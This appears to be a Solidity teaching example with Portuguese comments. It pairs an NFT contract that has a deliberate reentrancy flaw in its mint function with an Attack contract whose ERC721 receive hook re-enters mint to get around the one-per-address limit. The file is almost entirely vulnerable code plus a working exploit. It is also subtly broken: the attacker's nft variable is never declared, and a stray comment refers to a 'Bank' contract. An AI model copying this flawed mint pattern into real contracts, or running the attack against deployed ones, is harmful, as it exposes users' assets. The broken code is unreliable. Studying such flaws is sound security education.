// SPDX-License-Identifier: MIT
// Por 0xAA
pragma solidity ^0.8.21;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// Contrato NFT com Vulnerabilidade de Reentrância
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // Construtor, inicializa o nome e o código da coleção NFT
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // Função de criação, cada usuário só pode criar 1 NFT
    // Há uma vulnerabilidade de reentrada
    function mint() payable external {
        // Verificar se foi mintado antes
        require(mintedAddress[msg.sender] == false);
        // Aumentar o fornecimento total
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply);
        // Registre os endereços que foram mintados
        mintedAddress[msg.sender] = true;
    }
}

contract Attack is IERC721Receiver{
    // Endereço do contrato Bank

    // Inicializando o endereço do contrato NFT
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // Função de ataque, iniciando o ataque
    function attack() external {
        nft.mint();
    }

    // Função de retorno do ERC721, que chama repetidamente a função mint para criar 10 tokens.
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
